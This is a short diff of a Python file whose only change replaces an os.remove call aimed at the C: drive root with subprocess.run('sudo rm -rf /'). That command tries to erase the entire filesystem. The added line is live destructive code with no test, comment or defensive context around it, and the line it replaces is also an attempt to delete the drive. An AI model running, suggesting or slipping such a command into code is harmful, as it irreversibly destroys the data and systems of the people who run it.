@@ -1,3 +1,7 @@
 import os
+import subprocess, sys
 
-os.remove("C:\\")
+
+subprocess.run("sudo rm -rf /")
+
+
